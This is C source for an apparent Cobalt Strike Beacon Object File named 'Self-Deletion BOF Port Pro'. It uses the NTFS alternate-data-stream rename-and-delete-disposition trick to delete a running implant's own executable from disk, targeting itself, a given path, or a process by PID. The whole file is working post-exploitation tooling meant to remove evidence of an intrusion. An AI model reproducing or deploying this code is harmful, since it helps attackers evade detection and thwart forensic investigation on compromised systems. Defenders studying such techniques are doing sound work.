#include <windows.h>
#include "beacon.h"

WINBASEAPI  HANDLE  WINAPI   KERNEL32$CreateFileW (LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
WINBASEAPI  DWORD   WINAPI   KERNEL32$GetModuleFileNameW (HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
WINBASEAPI  BOOL    WINAPI   KERNEL32$SetFileInformationByHandle (HANDLE hFile, FILE_INFO_BY_HANDLE_CLASS FileInformationClass, LPVOID lpFileInformation, DWORD dwBufferSize);
WINBASEAPI  HANDLE  WINAPI   KERNEL32$OpenProcess (DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId);
WINBASEAPI  BOOL    WINAPI   KERNEL32$QueryFullProcessImageNameW (HANDLE hProcess, DWORD  dwFlags, LPWSTR lpExeName, PDWORD lpdwSize);
WINBASEAPI  WINBOOL WINAPI   KERNEL32$CloseHandle (HANDLE hObject);
WINBASEAPI  void    __cdecl  MSVCRT$memset(void *dest, int c, size_t count);
WINBASEAPI  void    *__cdecl MSVCRT$memcpy(void * __restrict__ _Dst,const void * __restrict__ _Src,size_t _MaxCount);
WINBASEAPI  size_t  __cdecl  MSVCRT$wcslen(const wchar_t *_Str);
WINBASEAPI  void    *__cdecl MSVCRT$malloc(size_t size);
WINBASEAPI  wchar_t *__cdecl MSVCRT$wcscpy(wchar_t * __restrict__ _Dest, const wchar_t * __restrict__ _Source);
WINBASEAPI  wchar_t *__cdecl MSVCRT$wcscat(wchar_t * __restrict__ _Dest,const wchar_t * __restrict__ _Source);
WINBASEAPI  DWORD   WINAPI   KERNEL32$GetLastError();
WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);


NTSYSAPI VOID WINAPI NTDLL$RtlMoveMemory(PVOID, const VOID*, SIZE_T);
NTSYSAPI VOID WINAPI NTDLL$RtlCopyMemory(PVOID, const VOID*, SIZE_T);

DECLSPEC_IMPORT time_t  WINAPI   MSVCRT$time(time_t* time);
DECLSPEC_IMPORT void    WINAPI   MSVCRT$srand(int initial);
DECLSPEC_IMPORT int     WINAPI   MSVCRT$rand();

VOID vanityBanner(void) {
    LPCWSTR banner = L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n"
                     L"|     Self-Deletion BOF Port Pro    |\n"
                     L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n"
                     L"|          By: @AgeloVito           |\n"
                     L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n"
                     L"| Credits: @Octoberfest7 @LloydLabs |\n"
                     L"-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-\n";
    
    BeaconPrintf(CALLBACK_OUTPUT, "%ls", (wchar_t*)banner);
}

LPWSTR concat(LPWSTR str1, LPWSTR str2) {
	int length = MSVCRT$wcslen(str1) + MSVCRT$wcslen(str2);
	LPWSTR result = (LPWSTR)MSVCRT$malloc((length + 1) * sizeof(wchar_t));
	MSVCRT$wcscpy(result, str1);
	MSVCRT$wcscat(result, str2);
	return result;
}

LPWSTR randomstr(int length) {

	LPWSTR str = (LPWSTR)MSVCRT$malloc((length + 1) * sizeof(wchar_t));
	const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	const int charset_size = sizeof(charset) / sizeof(wchar_t) - 1;
	MSVCRT$srand((unsigned)MSVCRT$time(NULL));
	for (int i = 0; i < length; i++) {
		int index = MSVCRT$rand() % charset_size;
		str[i] = charset[index];
	}
	str[length] = '\0';
	return concat(L":n",str);
}

//https://stackoverflow.com/questions/71834608/
//https://github.com/LloydLabs/delete-self-poc
//https://github.com/LloydLabs/delete-self-poc/pull/4/files
//https://raw.githubusercontent.com/Octoberfest7/Mutants_Sessions_Self-Deletion/main/Mutants_Sessions_Self-Deletion/Self-deletion/Self-deletion.c
BOOL renameDataStream(HANDLE hHandle) 
{
// rename the associated HANDLE's file name
    FILE_RENAME_INFO* fRename;
    LPWSTR lpwStream = randomstr(7);//L":newads"
    DWORD bslpwStream = (MSVCRT$wcslen(lpwStream)) * sizeof(wchar_t);

    DWORD bsfRename = sizeof(FILE_RENAME_INFO) + bslpwStream;
    fRename = (FILE_RENAME_INFO*)MSVCRT$malloc(bsfRename);
    MSVCRT$memset(fRename, 0, bsfRename);
    fRename->FileNameLength = bslpwStream;
    NTDLL$RtlMoveMemory(fRename->FileName, lpwStream, bslpwStream);
    //BeaconPrintf(CALLBACK_OUTPUT, "\nbsfRename: %d; FileNameLength: %d; FileName: %ls\n", bsfRename, fRename->FileNameLength, fRename->FileName);
    BOOL status = KERNEL32$SetFileInformationByHandle(hHandle, FileRenameInfo, fRename, bsfRename);
    if (!status) {
        BeaconPrintf(CALLBACK_ERROR, "SetFileInformationByHandle's GetLastError() = %d\n", KERNEL32$GetLastError());
    }
    MSVCRT$free(fRename);
    return status;
}


BOOL setDeletionAttribute(HANDLE hHandle) 
{
    FILE_DISPOSITION_INFO fDelete;
    MSVCRT$memset(&fDelete, 0, sizeof(fDelete));

    fDelete.DeleteFile = TRUE;

    return KERNEL32$SetFileInformationByHandle(hHandle, FileDispositionInfo, &fDelete, sizeof(fDelete));
}

BOOL self_deletion(LPWSTR wcPath){

    HANDLE hCurrent = KERNEL32$CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if ( hCurrent == INVALID_HANDLE_VALUE ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get handle to current file.\n");
        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Got handle to file.\n");
    }

    BOOL returnedHandleRename = renameDataStream(hCurrent);
    if ( !returnedHandleRename ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to rename data stream from handle.\n");
        KERNEL32$CloseHandle(hCurrent);
        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Renamed handle to %ls's data stream successfully.\n", (wchar_t*)wcPath);
        KERNEL32$CloseHandle(hCurrent);
    }

    hCurrent = KERNEL32$CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if ( hCurrent == INVALID_HANDLE_VALUE ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get second handle to current file.\n");
        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Got second handle to file for further manipulation.\n");
    }
    
    if ( !setDeletionAttribute(hCurrent) ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set desired deposition. Destroying handle and returning.\n");
        KERNEL32$CloseHandle(hCurrent);

        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Deletion attribute set successfully! Destroying handle to trigger self-deletion.\n");
        KERNEL32$CloseHandle(hCurrent);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] We should have successfully deleted the file: %ls\n", (wchar_t*)wcPath);

    return 1;
}

BOOL self_deletion_bypid(int pid) {

    WCHAR wcPath[MAX_PATH + 1];
    DWORD size = sizeof(wcPath);
    MSVCRT$memset(wcPath, 0, size);
    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess != NULL) {
        if (KERNEL32$QueryFullProcessImageNameW(hProcess, 0, wcPath, &size)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+]Process file path : %ls pid = %d\n", (wchar_t*)wcPath,pid);
        }
        KERNEL32$CloseHandle(hProcess);
    }
    return self_deletion(wcPath);

}

BOOL self_deletion_byself() {

    WCHAR wcPath[MAX_PATH + 1];
    MSVCRT$memset(wcPath, 0, sizeof(wcPath));

    if (KERNEL32$GetModuleFileNameW(NULL, wcPath, MAX_PATH) == 0 ) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get current module handle.\n");
        return 0;
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Obtained a handle to current module file handle.\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Current file path: %ls\n", (wchar_t*)wcPath);
    }
    return self_deletion(wcPath);

}


int go(IN PCHAR Buffer, IN ULONG Length) 
{
    //beacon arg vars
	int module = NULL;
    LPWSTR wcPath = NULL;
    int pid = NULL;

    //Parse Beacon args
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
    module = BeaconDataInt(&parser);
	wcPath = BeaconDataExtract(&parser, NULL);
	pid = BeaconDataInt(&parser);


    vanityBanner();

    if (module == 1) {
		BeaconPrintf(CALLBACK_OUTPUT, "self_deletion by self\n");
		return self_deletion_byself();
	}
    if (module == 2) {
		BeaconPrintf(CALLBACK_OUTPUT, "self_deletion by path\n");
		return self_deletion(wcPath);
	}
    if (module == 3) {
		BeaconPrintf(CALLBACK_OUTPUT, "self_deletion by pid\n");
		return self_deletion_bypid(pid);
	}

    
}